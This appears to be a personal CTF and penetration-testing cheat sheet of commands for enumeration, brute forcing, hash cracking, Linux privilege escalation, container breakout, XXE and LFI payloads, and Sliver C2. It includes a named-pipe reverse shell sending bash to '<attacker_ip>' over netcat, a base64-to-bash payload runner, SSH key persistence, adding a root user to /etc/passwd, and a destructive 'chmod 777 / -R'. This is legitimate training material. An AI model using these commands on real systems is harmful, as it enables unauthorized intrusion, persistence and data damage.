 ![[methodology_table.png]]
-  knowing your environment is crucial. 
-  use `nmap` for enumerating open ports. Don't forget about the UDP scan as well (`-sU`)
-  use `gobuster` for enumerating dirs. Don't forget to scan for files as well!!
	wordlists: - `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
			 -  `/usr/share/wordlists/dirb/common.txt`
			 -  `/usr/share/wordlists/dirb/big.txt`
-  `nikto -h <ip>`
-  use `wappalyser` - technology stack 
-  use `burpsuite`
-  analyze the source code.
-  maybe check [[OWASP (Open Web Application Security Project)]] top 10
-  overwriting existing files on a web server (like images)
-  look for uploading a reverse/bind shell to achieve RCE (remote code execution)
-  look for vulnerable versions
-  whenever you see domains redirects, try sub-domain brute forcing
###### ssh
 - log into a remote machine: `ssh <user>@<host>`
 - brute force: `hydra -l <username> -p wordlist.txt <ip> ssh -t 4`
if you have a private key encrypted: 
-  `ssh2john private_key > johncompatible.txt`
-  `john johncompatible.txt --wordlist=/usr/share/wordlists/rockyou.txt`
-  you can then use the cracked password for logging with the private key, `ssh -i path/to/private/key <user>@<host>` (`"Enter passphrase for key 'id_rsa':`), 
-  maybe leave a key in the remote machine's `authorized_keys` for a better shell (you don't have to deal with unstabilized reverse shells). You will be able to connect to the remote machine using your private key. You have the syntax in the previous bullet point. 
- if you have a private key: `chmod 600 id_rsa` -> `ssh -i path/to/id_rsa <user>@<host>`
- if you don't have a ssh key you could generate one on the target machine. ssh is more stable than a simple reverse shell (if you don't want to stabilize it yourself)
###### smb
-  `enum4linux -a <target-ip> | tee enum.log`
-  `nbtscan -r 192.168.0.1/24`
-  brute force:
	- `nmap --script smb-brute -p 445 <ip>` 
	- `hydra -l Administrator -p words.txt <ip> smb -t 1`
-  `nmap -p 139,445 -sVC -Pn -T5 --script smb-enum-shares,smb-brute,smb-system-info -oN nmap_smb basic.thm`
- `smbclient //skynet.thm/anonymous -I 10.10.86.85`
- smb commands: `mget <file> or "*"`, `ls`, `cd`
- `smbclient //skynet.thm/milesdyson -U milesdyson` (with password)
- `smbclient -L //<target-ip>` - list all the shares
###### Listen for ICMP packets with tcpdump
- `sudo tcpdump -i tun0 proto \\icmp`
###### FTP
- `ftp <ip>`
- [[Protocols and Servers#FTP (File Transfer Protocol)]]
- `wget -r ftp://<ip>`
###### privesc
-  read [[Linux Privilege Escalation]]
-  `sudo -l`
-  `linpeas.sh | tee linpeas.txt`
-  `grep -Ri --color 'password' /home /root 2>/dev/null` - list all the files containing the word 'password' that are located in the `/home` directory and `/root` directory
-  remember: horizontal escalation is also important!
-  don't rely too much on `linpeas.sh`
-  if `/bin/bash` has the SUID bit: `bash -p`
- `chmod 777 / -R` - make all files on the system available for everyone!
-  if you have an executable (created by root with the `SUID` bit set) that uses a command like `tail ...` (the **absolute path** is not specified), you can create your own `tail` and add the directory in which your `tail` is located to `$PATH` (`export PATH=$PWD:$PATH`). Make sure `$PWD` is the first on the list. You can use `string` to analyze an executable. I think this technique is called "**PATH hijacking**" or "**Environment Variable Injection**"
- [hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- try to find a way to add a user with root privileges in `/etc/passwd`, you can use `mkpasswd -m md5crypt -s` to create a password for the new user. `/etc/passwd` format: `<user>:<pass>:0:0:<user>:/root:/bin/bash`
![[etc_passwd_format.png]]
![[etc_passwd_format2.png]]
- [LD_PRELOAD](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
 
 ###### decodedecryptcrack:
-  `hashid` for inspecting a hash.
-  [base64](https://www.base64decode.org/)
-  [cyberchef](https://gchq.github.io/CyberChef/)
- `ssh2john`, `pgp2john` (JohnTheRipper)
- base64 decode command: `echo <base64-encoded-string> | base64 -d`
- base64 encode command: `base64 file.txt`
- `hashcat -h | grep SHA`
- `hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`
- `hashcat -m <hash_type> -a <attack_mode> hashfile [[List and count non-root, non-service, non-daemon users]]wordlist`
- for a `HMAC-SHA1` hash with a salt, specify the salt `<hash>:<salt>` in a text file and use `hashcat -m 160 hash.txt /usr/share/wordlists/rockyou.txt`
- [hashes.com](https://hashes.com/en/decrypt/hash)
- [URL Encoder/Decoder](https://meyerweb.com/eric/tools/dencoder/)
- For a protected zip archive with John the Ripper (the goat):
- `zip2john protected.zip > zip_hash.txt`
- `john zip_hash.txt --wordlist=/usr/share/wordlist/rockyou.txt`
- use "magic" on cyberchef
-  you can base64 encode a reverse shell payload so you can use it in a command line interface. `echo <payload> | base64 -d | bash` 

###### image metadata
- `exiftool <image>`
- `exiftool -time:all -v3 <image>` (Using `-time:all` ensures that you capture **all possible time-related tags** from EXIF, XMP, and IPTC metadata. `v3` - verbosity level)
	- example of changing the metadata of an image: 
	 `exiftool -CreateDate="1970:00:00 00:00:00.001" <image>`
	- `hexeditor <image>` - if you have to change read-only metadata. (remember that you're working with ASCII. `30` = `0` in ASCII)
- `strings <image>`
- `stegseek <image>`
- `steghide <image>`
- `steghide extract -sf <image>`
- `binwalk file`
- `binwalk -e file` - extract

###### interactive shell
- `python -c 'import pty; pty.spawn("/bin/bash")'`
- `CTRL + Z` to put the shell in the background
- `stty raw -echo;fg`
- press enter
- Full tty (teletypewriter) on [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/full-ttys)
- with a full tty you can ctrl+c without killing the reverse shell, @hostname, you can go left and right with the cursor, you don't get the random (not random) characters when using the arrows

###### Information Gathering via ChatGPT
- A way to find the release date of a specific version of a program is to search for `changelogs`
- You can use exiftool on a changelog file to get the creation date.
- In CTFs, gathering as much information as possible early on is key. Look at every file, every directory, every configuration.
- Check for accessible files that may contain passwords or sensitive information. Tools like `find` can help you locate configuration files (`find / -type f -name "*config*"`).
- In some cases, exploring the web interface or API of a web application (if one exists) can provide additional clues about where sensitive data might be stored.
- if you're in the 'adm' group, you can analyze the /var/log directory (interesting file in there: `auth.log`)

###### fuzzing
- `wfuzz -c -d "password=FUZZ" -w /usr/share/wordlists/rockyou.txt -u http://expose.thm:1337/file1010111/index.php --hc 200`
- `wfuzz -c -u <url> -z,range<start>,<end> --hc <status code>` (fuzz with number from `start` to `end`)
- `ffuf -u "http://cap.htb/data/FUZZ" -w <(seq 0 30000) -mc 200`
- for fuzzing wordlists you got the `/usr/share/seclists/Fuzzing` directory (it might be useful for LFI attacks as well: `/usr/share/seclists/Fuzzing/LFI/`)
- `ffuf -w count-9999.txt:W1 -w fake_ip_cut.txt:W2 -u "http://hammer.thm:1337/reset_password.php" -X "POST" -d "recovery_code=W1&s=80" -b "PHPSESSID=4f2a5gbr0te1djkibg137461jm" -H "X-Forwarded-For: W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -mode pitchfork -fw 1 -rate 100 -o output.txt`
- `-recursion`

###### Sub-domain enumeration
- `ffuf -u <url> -w <wordlist> -H 'FUZZ.analytical.htb'`  (use `-fs` for filtering size, or `-fw'` for filtering words)
###### Wireshark
- use "Follow stream" to better visualization (shortcut: `F3`)
###### LFI
- [HackTrics](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- Log Poisoning
- `/var/log/apache2/access.log`
- filters
- `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

###### LXD
- "lightervisor, or lightweight container hypervisor"
- [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [Shell script](https://www.exploit-db.com/exploits/46978)
- `lxc image import meta.tar.xz rootfs.tar.xz --alias alpine-3.17` (https://images.lxd.canonical.com/)
- get the root.tar.xz and meta.tar.xz, if you get the error with the metadata, you can create the file missing yourself: 
	-  `touch metadata.yaml`
	-  add the metadata (google it)
	- `tar -cJf meta.tar.xz metadata.yaml`
- `lxc launch alpine-3.17 <container-name (optional)> -c security.privileged=true` (`-c security.privileged=true` to launch a privileged container)
- `lxc stop <container-name>`
- `lxc start <container-name>`
-  mount host's filesystem to the container: `lxc config device add/remove <container-name> device disk source=/ path=/mnt/root`
- `lxc exec <container-name> -- /bin/sh`
- `ls /mnt/root`
- `lxc list` - status of all containers
- `lxc config show <container-name>`
- the changes made to the mounted filesystem will apply to the host's filesystem (you can modify /etc/passwd)

###### RDP (Remote Desktop Protocol)
-  `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.76 /u:THM\Administrator /p:'Password321'`

###### Port Knocking
-  "**Port knocking** is a network security technique used to dynamically open or close ports on a firewall based on a predefined sequence of connection attempts (or "knocks") to closed ports. It acts as a stealth mechanism to hide services and allow access only to authorized users who know the correct sequence." via ChatGPT
- Can be configured with `iptables` 
- [Port Knocking Explained](https://www.youtube.com/watch?v=IBR3oLqGBj4)
- `knockd`
- `https://github.com/eliemoutran/KnockIt` - brute force every port sequence
- `python3 knockit.py -b 10.10.252.187 1111 2222 3333 4444`
-  rescan the machine with `nmap`

###### Escaping a docker container
- You can "escape" a docker container if the host of the container has cron job running in the container. You can get a reverse shell by setting it up in the script that the cron job is executing.
- By the hostname of the machine you can determine whether or not you're in (docker) container. 
- Example: `root@7546fa2336d6:/opt/clean#`, the hostname is `7546fa2336d6` which should be a container id.
- More techniques for escaping a container (**Docker Breakout**): https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation

###### Named pipe
- A **named pipe** (FIFO) acts as a special file where one process can write data, and another process can read from it.
- Reverse shell with a named pipe:
	-  Open a listener: `nc -lvnp 4444`
	-  Create a named pipe on the victim machine: `mkfifo /tmp/reverse_pipe`
	-  Execute the reverse shell on the victim machine: `bash -i < /tmp/reverse_pipe 2>&1 | nc <attacker_ip> 4444 > /tmp/reverse_pipe`
	- Explanation: `bash -i < /tmp/reverse_pipe`: This starts an interactive `bash` shell that will read commands from `/tmp/reverse_pipe`. `2>&1`: This redirects both the standard output and standard error (i.e., the shell's output) to the pipe. `| nc <attacker_ip> 4444`: This pipes the input of the shell over to the attacker's machine on port `4444` using Netcat. `> /tmp/reverse_pipe`: This redirects the output from the attacker's machine back to the named pipe, where the shell will read it from.

###### CMS (Content Management System)
-  First of all, if the CMS version is vulnerable, look for exploits. 
-  Look for **uploading** a reverse shell.
-  for the login page, try weak credentials like "admin:password", "admin:admin"
-  search default credentials for the **CMS** you're working with

###### UPX (Ultimate Packer for eXecutables)
- `upx -d <executable>` - **UPX** decompress

###### XXE (XML external entity)
-  **XXE** payload (**Local File Inclusion**): 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  <!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```
- you can achieve **RCE** (**Remote Code Execution**) with **Log Poisoning** and the **XXE** local file inclusion payload
- you can use `expect://`
- you can do **SSRF** (**Server-Side Request Forgery**) with **XXE**
- [XXEinjector](https://github.com/enjoiz/XXEinjector)

###### OSINT
- **theHarvester**, **Shodan**, **Maltego**, **Recon-ng**, **Spiderfoot**, **Twint** (twitter OSINT)

###### DNS Spoofing
- add your ip to /etc/hosts on the victim machine. If there's a cron job running with root privileges that makes a request to a domain to get a file and then executes it, you can create a file in the specified path by the cron job with a reverse shell script to get the root shell. (revshells.com php pentest monkey)

###### HTML Injection
- `<img src='http:10.21.55.48:6969'>` , a web server has to be open (`python3 -m server.http 80`)

###### SSH tunneling
- "SSH tunneling, or SSH port forwarding, is **a method of transporting arbitrary data over an encrypted SSH connection**. SSH tunnels allow connections made to a local port (that is, to a port on your own desktop) to be forwarded to a remote machine via a secure channel."
- `ssh -L [local_port]:[remote_host]:[remote_port] [user]@[ssh_server]`

###### Sliver C2
- https://github.com/BishopFox/sliver, you have a one liner for installing it.
- `sudo systemctl start sliver.service`
- `sliver`
- `sliver > generate --mtls <local-ip>:8888 --os linux --save shell.elf`
- start MTLS listener: `sliver > mtls`
- `sliver > use`: to interact with a session
- after session is selected:
	- `sliver (SILENT_RUBBER) > info` - for displaying target machine info
	- `sliver (SILENT_RUBBER) > shell` - drop into a shell
		-  `exit` -> `CTRL + D` - get back to the sliver prompt
	- `sliver (SILETN_RUBBER) > netstat`
	- `sliver (SILETN_RUBBER) > ifconfig`
	- `sliver (SILETN_RUBBER) > help` 
- you can set up socks5 proxies with sliver
	- `sliver (SILENT_RUBBER) > socks5 start` -> make sure you have `/etc/proxychains4.conf` set up
	- you can then use `rustscan` for port scanning.

###### git
- `git log`
- `git branch`
- `git checkout <branch-name>`
- `git switch --detach <commit-hash>` (switch to commit without creating a new branch)
- `git switch -c <new-branch-name> <commit-hash>` (switch to commit and create a new branch from it)